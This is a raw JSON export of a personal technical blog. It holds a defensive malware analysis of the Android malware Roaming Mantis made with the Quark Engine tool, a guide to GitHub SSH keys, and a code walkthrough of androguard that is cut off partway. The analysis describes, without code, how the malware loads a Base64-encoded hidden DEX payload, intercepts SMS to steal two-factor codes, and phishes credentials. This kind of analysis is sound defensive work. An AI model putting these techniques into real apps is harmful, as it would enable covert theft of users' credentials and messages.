href=\"#Summary-Report-of-the-DEX-file\" class=\"headerlink\" title=\"Summary Report of the DEX file\"></a>Summary Report of the DEX file</h2><p>Now, let’s do the summary report again for the DEX payload, we found 37 suspicious activities.</p>\n<p><img src=\"https://i.imgur.com/CrY5STX.png\"></p>\n<p>We simply summarize these suspicious behaviors into twelve categories.</p>\n<ol>\n<li>Connect to the remote server</li>\n<li>Start a web server</li>\n<li>Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMS</li>\n<li>Access network information</li>\n<li>Access phone information</li>\n<li>Access personal information</li>\n<li>Record audio&#x2F;video</li>\n<li>Load external class</li>\n<li>Access currently running applications and installed packages</li>\n<li>Make a phone call</li>\n<li>Open a web page</li>\n<li>Install other APKs from the file</li>\n</ol>\n<p>Next, we will introduce some interesting and highly suspicious activities to you based on the above categories.</p>\n<h2 id=\"1-Connect-to-the-remote-server\"><a href=\"#1-Connect-to-the-remote-server\" class=\"headerlink\" title=\"1. Connect to the remote server\"></a>1. Connect to the remote server</h2><h3 id=\"Rule-Classification-a-x2F-b-a\"><a href=\"#Rule-Classification-a-x2F-b-a\" class=\"headerlink\" title=\"Rule Classification: a&#x2F;b;a\"></a>Rule Classification: a&#x2F;b;a</h3><p><img src=\"https://i.imgur.com/H2w1mJw.png\"></p>\n<p>C2 connections are common in malware. This is a clue for further C2 investigation.</p>\n<h2 id=\"2-Start-a-web-server\"><a href=\"#2-Start-a-web-server\" class=\"headerlink\" title=\"2. Start a web server\"></a>2. Start a web server</h2><h3 id=\"Rule-Classification-b-x2F-g-run\"><a href=\"#Rule-Classification-b-x2F-g-run\" class=\"headerlink\" title=\"Rule Classification: b&#x2F;g;run\"></a>Rule Classification: b&#x2F;g;run</h3><p><img src=\"https://i.imgur.com/4Wk6bYC.png\"></p>\n<p>Our investigation proves that the malware starts a web server and tricks users into filling credentials like username, password, etc.</p>\n<h2 id=\"3-Monitor-x2F-Delete-x2F-Send-SMS-x2F-MMS\"><a href=\"#3-Monitor-x2F-Delete-x2F-Send-SMS-x2F-MMS\" class=\"headerlink\" title=\"3. Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMS\"></a>3. Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMS</h2><h3 id=\"Rule-Classification-com-x2F-n-b\"><a href=\"#Rule-Classification-com-x2F-n-b\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;n;b\"></a>Rule Classification: com&#x2F;n;b</h3><p><img src=\"https://i.imgur.com/ZDz9lKw.png\"></p>\n<h3 id=\"Rule-Classification-com-x2F-Loader-s-onReceive\"><a href=\"#Rule-Classification-com-x2F-Loader-s-onReceive\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;Loader$s;onReceive\"></a>Rule Classification: com&#x2F;Loader$s;onReceive</h3><p><img src=\"https://i.imgur.com/HdtYquG.png\"></p>\n<h3 id=\"Rule-Classification-com-x2F-Loader-start\"><a href=\"#Rule-Classification-com-x2F-Loader-start\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;Loader;start\"></a>Rule Classification: com&#x2F;Loader;start</h3><p><img src=\"https://i.imgur.com/bbiqb9e.png\"></p>\n<p>Our investigation proves that these operations concerning SMS might launch activities like:</p>\n<ol>\n<li>Steal verification code for the two-factor authentication.</li>\n<li>Steal verification code during online purchasing.</li>\n</ol>\n<h2 id=\"4-Access-phone-information\"><a href=\"#4-Access-phone-information\" class=\"headerlink\" title=\"4. Access phone information\"></a>4. Access phone information</h2><h3 id=\"Rule-Classification-a-x2F-a-a\"><a href=\"#Rule-Classification-a-x2F-a-a\" class=\"headerlink\" title=\"Rule Classification: a&#x2F;a;a\"></a>Rule Classification: a&#x2F;a;a</h3><p><img src=\"https://i.imgur.com/4q30DC6.png\"></p>\n<h3 id=\"Rule-Classification-com-x2F-Loader-ag-1-a\"><a href=\"#Rule-Classification-com-x2F-Loader-ag-1-a\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;Loader$ag$1;a\"></a>Rule Classification: com&#x2F;Loader$ag$1;a</h3><p><img src=\"https://i.imgur.com/qE24Cjr.png\"></p>\n<p>Our investigation proves that these operations concerning “access phone information” might launch activities like:</p>\n<ol>\n<li>Query the IMEI number to targeting the Asian region.</li>\n<li>Check the SIM card status just make sure the victim’s phone works.</li>\n</ol>\n<h2 id=\"5-Record-audio-x2F-video\"><a href=\"#5-Record-audio-x2F-video\" class=\"headerlink\" title=\"5. Record audio&#x2F;video\"></a>5. Record audio&#x2F;video</h2><h3 id=\"Rule-Classification-com-x2F-j-a\"><a href=\"#Rule-Classification-com-x2F-j-a\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;j;a\"></a>Rule Classification: com&#x2F;j;a</h3><p><img src=\"https://i.imgur.com/7RCWH27.png\"></p>\n<p>Thrilling! This malware records your audio&#x2F;video!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This report shows how malware analysts can use the quark engine to quickly guess behaviors of malware and to quickly validate their guess through call graphs and the classification table.</p>\n<p>In this report, we show that Quark Engine bypassed the obfuscation techniques used in Roaming Mantis. Also, this time we provide some useful rule sets for the detection. E.g. detecting payload decryption, dex loader, method reflection, SMS operation, potential c2 connection etc. And all these rules are generated by using our auto-generate tools.</p>\n<p>We’re proud of our work and we love to play around with it.</p>\n<p>So, if you want to take a sip of the quark engine. Please visit our GitHub  repository:</p>\n<ul>\n<li><a href=\"https://bit.ly/2ISYG2s\">https://bit.ly/2ISYG2s</a></li>\n</ul>\n<p>And the rules used in this report.</p>\n<ul>\n<li><a href=\"https://bit.ly/3jAOkAv\">https://bit.ly/3jAOkAv</a></li>\n</ul>\n<p>You can generate rules by yourself if you can’t wait for our next rule release!</p>\n<ul>\n<li><a href=\"https://bit.ly/2IJNxkE\">https://bit.ly/2IJNxkE</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Analyze-Roaming-Mantis-with-Quark-Engine\"><a href=\"#Analyze-Roaming-Mantis-with-Quark-Engine\" class=\"headerlink\" title=\"Analyze Roaming Mantis with Quark-Engine\"></a>Analyze Roaming Mantis with Quark-Engine</h1><p><img src=\"https://i.imgur.com/HSJF3nj.png\"></p>\n<h1 id=\"Introduction\"><a href=\"#Introduction\" class=\"headerlink\" title=\"Introduction\"></a>Introduction</h1><p>Roaming Mantis is a notorious malware that was first discovered in 2018 and aims at the Asian region. In the past two years, it has evolved and spread around the world. This malware intends to steal personal sensitive data (e.g. account information, SMS messages, and voice calls). Also, the malware bypassed the two-factor authentication by monitoring SMS messages.</p>\n<p>According to the report from Kaspersky Lab, the main distribution of this malware is using DNS hijacking through a compromised router. As long as the user connects to the router, their DNS lookup will be redirected to the malicious URL. After the user connects to the malicious website, they will be prompted to download the Google update application, which turns out to be the Android malware.</p>\n<p>In this report, we focus on the APK downloaded by victims who were redirected to the malicious URL. We aim at showing how malware analysts can use Quark Engine to quickly understand what this malware does to the victim.</p>\n<p>This malware contains a DEX file encoded by the base64 algorithm. Therefore, we will first demonstrate how we can use sets of detection rules to quickly find where to decode the base64 algorithm and where to load the DEX file in the malware.</p>\n<p>After decrypting the DEX file. We then further investigate malicious activities in the DEX file with sets of our detection rules. Also, we prove that obfuscation techniques are useless due to the magic design of Quark Engine.</p>\n<p>All in all, we show that by using Quark and detection rule sets, malware analysis can be so much fun.</p>\n<h1 id=\"Investigating-the-Android-APK\"><a href=\"#Investigating-the-Android-APK\" class=\"headerlink\" title=\"Investigating the Android APK\"></a>Investigating the Android APK</h1><h2 id=\"Summary-Report-for-the-APK\"><a href=\"#Summary-Report-for-the-APK\" class=\"headerlink\" title=\"Summary Report for the APK\"></a>Summary Report for the APK</h2><p><img src=\"https://i.imgur.com/Ycu9DTH.png\"></p>\n<p>In this report, our engine found 10 potential malicious activities with detection rules accordingly. As for the confidence, scores, and weight, please take a look at our talk at DEFCON Blue Team Village videos on YouTube. We explain everything there.</p>\n<div class=\"video-container\"><iframe src=\"https://www.youtube.com/embed/XK-yqHPnsvc\" frameborder=\"0\" loading=\"lazy\" allowfullscreen></iframe></div>\n\n<p>The scoring system will only take effect if we have enough detection rules. Before we accumulate enough rules, we set the scores and weights all the same. Therefore, the risk levels and total scores are for reference only.</p>\n<p>After generating the summary report, we then use an automatic technique to classify these 10 potential malicious activities.</p>\n<h2 id=\"Exploring-Malicious-Activities\"><a href=\"#Exploring-Malicious-Activities\" class=\"headerlink\" title=\"Exploring Malicious Activities\"></a>Exploring Malicious Activities</h2><h3 id=\"Rule-Classification-onCreate\"><a href=\"#Rule-Classification-onCreate\" class=\"headerlink\" title=\"Rule Classification: onCreate\"></a>Rule Classification: onCreate</h3><p><img src=\"https://i.imgur.com/8Q1Ajf7.png\"></p>\n<p>The picture above shows that 5 suspicious activities were found under the function onCreate.</p>\n<p>This picture can help malware analysts to understand the malware in an easy way.</p>\n<p>As shown above, we found five behaviors in function onCreate. Despite that rules are not listed in the right order, we can still piece them together and tell a story.</p>\n<p>With the descriptions in the table, we can simply and quickly guess that this function decodes and load the suspicious payload.</p>\n<p>After validating through reading the smali-like source codes, our guess is right!</p>\n<p>And the right order of the behaviors is:</p>\n<ol>\n<li>Get the absolute path of the file and store it in a string.</li>\n<li>Open a file from the given absolute path of the file.</li>\n<li>Read a file from the assets directory.</li>\n<li>Write file after Base64 decoding.</li>\n<li>Load additional DEX files dynamically.</li>\n</ol>\n<h3 id=\"Rule-Classification-a\"><a href=\"#Rule-Classification-a\" class=\"headerlink\" title=\"Rule Classification: a\"></a>Rule Classification: a</h3><p><img src=\"https://i.imgur.com/cB0ke4D.png\"></p>\n<p>As shown above, it is obvious that function a is about to do method reflection, MAGIC!</p>\n<h3 id=\"Rule-Classification-run\"><a href=\"#Rule-Classification-run\" class=\"headerlink\" title=\"Rule Classification: run\"></a>Rule Classification: run</h3><p><img src=\"https://i.imgur.com/oJVy5b3.png\"></p>\n<p>Anther method reflection detected!! MAGIC!</p>\n<h1 id=\"Decrypting-the-DEX-file\"><a href=\"#Decrypting-the-DEX-file\" class=\"headerlink\" title=\"Decrypting the DEX file\"></a>Decrypting the DEX file</h1><p>As mentioned above, we know that the Roaming Mantis reads a file from the assets directory and uses Base64 to decode it. For further investigation, we find the file of the DEX payload.</p>\n<p><img src=\"https://i.imgur.com/8isbtIy.png\"></p>\n<p>After unzipping the “assets&#x2F;db” file, we then use the Base64 to decode it and rename it Roaming_Mantis.dex.</p>\n<p><img src=\"https://i.imgur.com/jsyEBYd.png\"></p>\n<p>Now we have the DEX payload!.</p>\n<hr>\n<h2 id=\"Summary-Report-of-the-DEX-file\"><a href=\"#Summary-Report-of-the-DEX-file\" class=\"headerlink\" title=\"Summary Report of the DEX file\"></a>Summary Report of the DEX file</h2><p>Now, let’s do the summary report again for the DEX payload, we found 37 suspicious activities.</p>\n<p><img src=\"https://i.imgur.com/CrY5STX.png\"></p>\n<p>We simply summarize these suspicious behaviors into twelve categories.</p>\n<ol>\n<li>Connect to the remote server</li>\n<li>Start a web server</li>\n<li>Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMS</li>\n<li>Access network information</li>\n<li>Access phone information</li>\n<li>Access personal information</li>\n<li>Record audio&#x2F;video</li>\n<li>Load external class</li>\n<li>Access currently running applications and installed packages</li>\n<li>Make a phone call</li>\n<li>Open a web page</li>\n<li>Install other APKs from the file</li>\n</ol>\n<p>Next, we will introduce some interesting and highly suspicious activities to you based on the above categories.</p>\n<h2 id=\"1-Connect-to-the-remote-server\"><a href=\"#1-Connect-to-the-remote-server\" class=\"headerlink\" title=\"1. Connect to the remote server\"></a>1. Connect to the remote server</h2><h3 id=\"Rule-Classification-a-x2F-b-a\"><a href=\"#Rule-Classification-a-x2F-b-a\" class=\"headerlink\" title=\"Rule Classification: a&#x2F;b;a\"></a>Rule Classification: a&#x2F;b;a</h3><p><img src=\"https://i.imgur.com/H2w1mJw.png\"></p>\n<p>C2 connections are common in malware. This is a clue for further C2 investigation.</p>\n<h2 id=\"2-Start-a-web-server\"><a href=\"#2-Start-a-web-server\" class=\"headerlink\" title=\"2. Start a web server\"></a>2. Start a web server</h2><h3 id=\"Rule-Classification-b-x2F-g-run\"><a href=\"#Rule-Classification-b-x2F-g-run\" class=\"headerlink\" title=\"Rule Classification: b&#x2F;g;run\"></a>Rule Classification: b&#x2F;g;run</h3><p><img src=\"https://i.imgur.com/4Wk6bYC.png\"></p>\n<p>Our investigation proves that the malware starts a web server and tricks users into filling credentials like username, password, etc.</p>\n<h2 id=\"3-Monitor-x2F-Delete-x2F-Send-SMS-x2F-MMS\"><a href=\"#3-Monitor-x2F-Delete-x2F-Send-SMS-x2F-MMS\" class=\"headerlink\" title=\"3. Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMS\"></a>3. Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMS</h2><h3 id=\"Rule-Classification-com-x2F-n-b\"><a href=\"#Rule-Classification-com-x2F-n-b\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;n;b\"></a>Rule Classification: com&#x2F;n;b</h3><p><img src=\"https://i.imgur.com/ZDz9lKw.png\"></p>\n<h3 id=\"Rule-Classification-com-x2F-Loader-s-onReceive\"><a href=\"#Rule-Classification-com-x2F-Loader-s-onReceive\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;Loader$s;onReceive\"></a>Rule Classification: com&#x2F;Loader$s;onReceive</h3><p><img src=\"https://i.imgur.com/HdtYquG.png\"></p>\n<h3 id=\"Rule-Classification-com-x2F-Loader-start\"><a href=\"#Rule-Classification-com-x2F-Loader-start\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;Loader;start\"></a>Rule Classification: com&#x2F;Loader;start</h3><p><img src=\"https://i.imgur.com/bbiqb9e.png\"></p>\n<p>Our investigation proves that these operations concerning SMS might launch activities like:</p>\n<ol>\n<li>Steal verification code for the two-factor authentication.</li>\n<li>Steal verification code during online purchasing.</li>\n</ol>\n<h2 id=\"4-Access-phone-information\"><a href=\"#4-Access-phone-information\" class=\"headerlink\" title=\"4. Access phone information\"></a>4. Access phone information</h2><h3 id=\"Rule-Classification-a-x2F-a-a\"><a href=\"#Rule-Classification-a-x2F-a-a\" class=\"headerlink\" title=\"Rule Classification: a&#x2F;a;a\"></a>Rule Classification: a&#x2F;a;a</h3><p><img src=\"https://i.imgur.com/4q30DC6.png\"></p>\n<h3 id=\"Rule-Classification-com-x2F-Loader-ag-1-a\"><a href=\"#Rule-Classification-com-x2F-Loader-ag-1-a\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;Loader$ag$1;a\"></a>Rule Classification: com&#x2F;Loader$ag$1;a</h3><p><img src=\"https://i.imgur.com/qE24Cjr.png\"></p>\n<p>Our investigation proves that these operations concerning “access phone information” might launch activities like:</p>\n<ol>\n<li>Query the IMEI number to targeting the Asian region.</li>\n<li>Check the SIM card status just make sure the victim’s phone works.</li>\n</ol>\n<h2 id=\"5-Record-audio-x2F-video\"><a href=\"#5-Record-audio-x2F-video\" class=\"headerlink\" title=\"5. Record audio&#x2F;video\"></a>5. Record audio&#x2F;video</h2><h3 id=\"Rule-Classification-com-x2F-j-a\"><a href=\"#Rule-Classification-com-x2F-j-a\" class=\"headerlink\" title=\"Rule Classification: com&#x2F;j;a\"></a>Rule Classification: com&#x2F;j;a</h3><p><img src=\"https://i.imgur.com/7RCWH27.png\"></p>\n<p>Thrilling! This malware records your audio&#x2F;video!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This report shows how malware analysts can use the quark engine to quickly guess behaviors of malware and to quickly validate their guess through call graphs and the classification table.</p>\n<p>In this report, we show that Quark Engine bypassed the obfuscation techniques used in Roaming Mantis. Also, this time we provide some useful rule sets for the detection. E.g. detecting payload decryption, dex loader, method reflection, SMS operation, potential c2 connection etc. And all these rules are generated by using our auto-generate tools.</p>\n<p>We’re proud of our work and we love to play around with it.</p>\n<p>So, if you want to take a sip of the quark engine. Please visit our GitHub  repository:</p>\n<ul>\n<li><a href=\"https://bit.ly/2ISYG2s\">https://bit.ly/2ISYG2s</a></li>\n</ul>\n<p>And the rules used in this report.</p>\n<ul>\n<li><a href=\"https://bit.ly/3jAOkAv\">https://bit.ly/3jAOkAv</a></li>\n</ul>\n<p>You can generate rules by yourself if you can’t wait for our next rule release!</p>\n<ul>\n<li><a href=\"https://bit.ly/2IJNxkE\">https://bit.ly/2IJNxkE</a></li>\n</ul>\n"},{"title":"Using SSH to connect with Github","date":"2022-06-05T14:31:51.000Z","_content":"\n# Using SSH to connect with Github\n\n\n## Creat your own dir for ssh\n\n```bash=\nmkdir ~/.ssh\n\nchmod 700 ~/.ssh\n```\n\n## Generate your Key\n\n```bash=\ncd ~/.ssh\n\nssh-keygen -t rsa -b 4096 -C \"your@gmail.com\"\n\n# copy item from id_rsa.pub\ncat id_rsa.pub\n```\n\n## Set up your Github\n\n![](https://i.imgur.com/QSUS6qb.png)\n![](https://i.imgur.com/PpZMrWV.png)\n![](https://i.imgur.com/zHo92u9.png)\n\nPaste your content of the id_rsa.pub to here\n![](https://i.imgur.com/cFmIzKG.png)\n\n\n\n## Test it\n\n```bash=\nssh -T git@github.com\n```\n\n```bash=\ngit@github.com:krnick/your_repo.git\n```\n","source":"_posts/Using-SSH-to-connect-with-Github.md","raw":"---\ntitle: Using SSH to connect with Github\ndate: 2022-06-05 22:31:51\ntags:\n---\n\n# Using SSH to connect with Github\n\n\n## Creat your own dir for ssh\n\n```bash=\nmkdir ~/.ssh\n\nchmod 700 ~/.ssh\n```\n\n## Generate your Key\n\n```bash=\ncd ~/.ssh\n\nssh-keygen -t rsa -b 4096 -C \"your@gmail.com\"\n\n# copy item from id_rsa.pub\ncat id_rsa.pub\n```\n\n## Set up your Github\n\n![](https://i.imgur.com/QSUS6qb.png)\n![](https://i.imgur.com/PpZMrWV.png)\n![](https://i.imgur.com/zHo92u9.png)\n\nPaste your content of the id_rsa.pub to here\n![](https://i.imgur.com/cFmIzKG.png)\n\n\n\n## Test it\n\n```bash=\nssh -T git@github.com\n```\n\n```bash=\ngit@github.com:krnick/your_repo.git\n```\n","slug":"Using-SSH-to-connect-with-Github","published":1,"updated":"2023-04-20T07:41:28.344Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clgotepn3000mi7ri4xsjdu8n","content":"<h1 id=\"Using-SSH-to-connect-with-Github\"><a href=\"#Using-SSH-to-connect-with-Github\" class=\"headerlink\" title=\"Using SSH to connect with Github\"></a>Using SSH to connect with Github</h1><h2 id=\"Creat-your-own-dir-for-ssh\"><a href=\"#Creat-your-own-dir-for-ssh\" class=\"headerlink\" title=\"Creat your own dir for ssh\"></a>Creat your own dir for ssh</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/.ssh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Generate-your-Key\"><a href=\"#Generate-your-Key\" class=\"headerlink\" title=\"Generate your Key\"></a>Generate your Key</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\"></span><br><span class=\"line\">ssh-keygen -t rsa -b 4096 -C <span class=\"string\">&quot;your@gmail.com&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># copy item from id_rsa.pub</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> id_rsa.pub</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Set-up-your-Github\"><a href=\"#Set-up-your-Github\" class=\"headerlink\" title=\"Set up your Github\"></a>Set up your Github</h2><p><img src=\"https://i.imgur.com/QSUS6qb.png\"><br><img src=\"https://i.imgur.com/PpZMrWV.png\"><br><img src=\"https://i.imgur.com/zHo92u9.png\"></p>\n<p>Paste your content of the id_rsa.pub to here<br><img src=\"https://i.imgur.com/cFmIzKG.png\"></p>\n<h2 id=\"Test-it\"><a href=\"#Test-it\" class=\"headerlink\" title=\"Test it\"></a>Test it</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git@github.com:krnick/your_repo.git</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Using-SSH-to-connect-with-Github\"><a href=\"#Using-SSH-to-connect-with-Github\" class=\"headerlink\" title=\"Using SSH to connect with Github\"></a>Using SSH to connect with Github</h1><h2 id=\"Creat-your-own-dir-for-ssh\"><a href=\"#Creat-your-own-dir-for-ssh\" class=\"headerlink\" title=\"Creat your own dir for ssh\"></a>Creat your own dir for ssh</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">mkdir</span> ~/.ssh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> 700 ~/.ssh</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Generate-your-Key\"><a href=\"#Generate-your-Key\" class=\"headerlink\" title=\"Generate your Key\"></a>Generate your Key</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> ~/.ssh</span><br><span class=\"line\"></span><br><span class=\"line\">ssh-keygen -t rsa -b 4096 -C <span class=\"string\">&quot;your@gmail.com&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># copy item from id_rsa.pub</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> id_rsa.pub</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Set-up-your-Github\"><a href=\"#Set-up-your-Github\" class=\"headerlink\" title=\"Set up your Github\"></a>Set up your Github</h2><p><img src=\"https://i.imgur.com/QSUS6qb.png\"><br><img src=\"https://i.imgur.com/PpZMrWV.png\"><br><img src=\"https://i.imgur.com/zHo92u9.png\"></p>\n<p>Paste your content of the id_rsa.pub to here<br><img src=\"https://i.imgur.com/cFmIzKG.png\"></p>\n<h2 id=\"Test-it\"><a href=\"#Test-it\" class=\"headerlink\" title=\"Test it\"></a>Test it</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -T git@github.com</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git@github.com:krnick/your_repo.git</span><br></pre></td></tr></table></figure>\n"},{"title":"androguard code tracing","date":"2022-04-22T07:12:30.000Z","_content":"\n# androguard code trace\n\n\n## androguard Usage\n\nThis is the most common way how we use androguard.\n\n```python=\nfrom androguard.misc import AnalyzeAPK\n\n\napk, dalvikvmformat, analysis = AnalyzeAPK(apk_filepath)\n```\n\n---\n\n## Entry Point\n\nLet' us start from the ***AnalyzeAPK***.\n\n## AnalyzeAPK(androguard/misc.py)\n\nResponsible for the generation of the three objects below.\n\n* apk\n* dalvikvmformat\n* analysis\n\n---\n\n### [apk object](https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.apk.APK)\n\nYou can get information like the package name, permissions from the AndroidManifest.xml, which generated by class APK().\n\n**androguard/misc.py**\n\n```python=\na = APK(_file, raw=raw)\n```\n\n\n**androguard/core/bytecodes/apk.py**\n```python=\nclass APK():\n```\n\nIt will parse files in APK through Python zipfile module. This APK object is responsible for decompressing \"AndroidManifest.xml\" in APK.\n\nImplementation function:\n\n**androguard/core/bytecodes/apk.py**\n\n```python=\nif not skip_analysis:\n    self._apk_analysis()\n```\n\n```python=\ndef _apk_analysis(self)\n```\n\nASRC class\n\n    for decoding resources.arsc\n\nAXML class\n\n    for decoding AndroidManifest.xml and all other XML files\n    \nInside this method, it will get the information below.\n\n* AXML\n* Permissions\n* Each tag in xml\n\nThe following video records the process of making an apk object.\n\n{%youtube CpwzaB6U7BU %}\n\n\n---\n\n### [dalvikvmformat Object](https://androguard.readthedocs.io/en/latest/api/androguard.core.bytecodes.html#androguard.core.bytecodes.dvm.DalvikVMFormat)\n\nThe DalvikVMFormat corresponds to the DEX file found inside the APK file. You can get classes, methods or strings from the DEX file.\n\n\n**androguard/misc.py**\n\n```python=\nd = []\ndx = Analysis()\nfor dex in a.get_all_dex():\n    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())\n    dx.add(df)\n    d.append(df)\n    df.set_decompiler(decompiler.DecompilerDAD(d, dx))\n\ndx.create_xref()\n\nreturn a, d, dx\n```\n\n\n\n---\n\n### [Analysis Object](https://androguard.readthedocs.io/en/latest/api/androguard.core.analysis.html#androguard.core.analysis.analysis.Analysis)\n\nThe Analysis object should be used instead, as it contains special classes, which link information about the classes.dex and can even handle many DEX files at once.\n\nThe Analysis contains a lot of information about (multiple) DalvikVMFormat objects Features are for example XREFs between Classes, Methods, Fields, and Strings. Yet another part is the creation of BasicBlocks, which is important in the usage of the Androguard Decompiler.\n\n\n**quark/androguard/misc.py**\n\n```python=\ndx = Analysis()\n```\n\n**androguard/core/analysis/analysis.py**\n\n```python=\nclass Analysis:\n```\n\nFind information inside DEX file:\n\n* DalvikVMFormat objects\n* classname\n* string\n* methods\n\n[EXTERNAL method](https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html)\n\nIt is called the native API.\n\n[XREFs](https://androguard.readthedocs.io/en/latest/intro/gettingstarted.html#xrefs)\n\nClasses, Methods, Fields, and Strings.\n\n---\n\nInitialize d and dx.\n\n![](https://i.imgur.com/uBkdkWj.png)\n\n\nPrepare for the following code below.\n\n```python=\nfor dex in a.get_all_dex():\n    df = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())\n    dx.add(df)\n    d.append(df)\n    df.set_decompiler(decompiler.DecompilerDAD(d, dx))\n\ndx.create_xref()\n```\n\nParam dex will return the raw data of all classes dex files.\n\n```python=\nget_all_dex()\n\n    dexre = re.compile(r\"classes(\\d*).dex\")\n    return filter(lambda x: dexre.match(x), self.get_files())\n```\n\n`get_all_dex` get all the file names in the zip, and get all the class.dex files through regular expressions, it may be classes.dex or classes[0-9]+.dex.\n\n\n**quark/androguard/misc.py**\n\n```python=\ndf = DalvikVMFormat(dex, using_api=a.get_target_sdk_version())\n```\n\nDalvikVMFormat takes the binary content of each DEX as a parameter, and initializes the class DalvikVMFormat according to the API version used.\n\n\n**androguard/core/bytecodes/dvm.py**\n\n```python=\nclass DalvikVMFormat(bytecode.BuffHandle):\n    \"\"\"\n    This class can parse a classes.dex file of an Android application (APK).\n\n    :param buff: a string which represents the classes.dex file\n    :param decompiler: associate a decompiler object to display the java source code\n    :type buff: bytes\n    :type decompiler: object\n\n    example::\n\n        d = DalvikVMFormat( read(\"classes.dex\") )\n    \"\"\"\n\n    def __init__(self, buff, decompiler=None, config=None, using_api=None):\n        # to allow to pass apk object ==> we do not need to pass additionally target version\n        if isinstance(buff, APK):\n            self.api_version = buff.get_target_sdk_version()\n            buff = buff.get_dex()  # getting dex from APK file\n        elif using_api:\n            self.api_version = using_api\n        else:\n            self.api_version = CONF[\"DEFAULT_API\"]\n\n        super().__init__(buff)\n        self._flush()\n\n        self.CM = ClassManager(self)\n        self.CM.set_decompiler(decompiler)\n\n        self._preload(buff)\n        self._load(buff)\n```\n\nThis class can parse a classes.dex file of an Android application (APK).\n\n\n\n**androguard/core/bytecodes/dvm.py**\n\n* ClassManager\n\nThis class is used to access to all elements (strings, type, proto ...) of the dex format based on their offset or index.\n\n\n* set_decompiler\n\nSetting the disassembled tool used for disassembling an apk such as Jadx or DAD.\n\n\nLast one:\n\n**androguard/core/analysis/analysis.py**\n\n```python=\ndx.create_xref()\n```\n\nCreate Class, Method, String, and Field crossreferences for all classes in the Analysis.\n\nIf you are using multiple DEX files, this function must be called when all DEX files are added. If you call the function after every DEX file, it will only work for the first time.\n\nThis function is already called in the object Analysis, so we don't need to call it again.\n\n\nThe following video records the process of making an DalvikVMFormat object.\n\n{%youtube Q3oCMVyhGLw %}\n\n\n# Important\n\n\nOnly when calling the `get_source_method` function in [DecompilerDAD](https://androguard.readthedocs.io/en/latest/api/androguard.decompiler.html#androguard.decompiler.decompiler.DecompilerDAD) is it considered that disassemble an apk.\n\nIn fact, we only use the information in the Dex file and the method of cross-references, as well as the information about android permission. We did not do the disassemble an apk.\n\n\n\n\n\n\n","source":"_posts/androguard-code-tracing.md","raw":"---\ntitle: androguard code tracing\ndate: 2022-04-22 15:12:30\ntags:\n---\n\n# androguard code trace\n\n\n## androguard Usage\n\nThis is the most common way how we use androguard.\n\n```python=\nfrom androguard.misc import AnalyzeAPK\n\n\napk, dalvikvmformat, analysis = 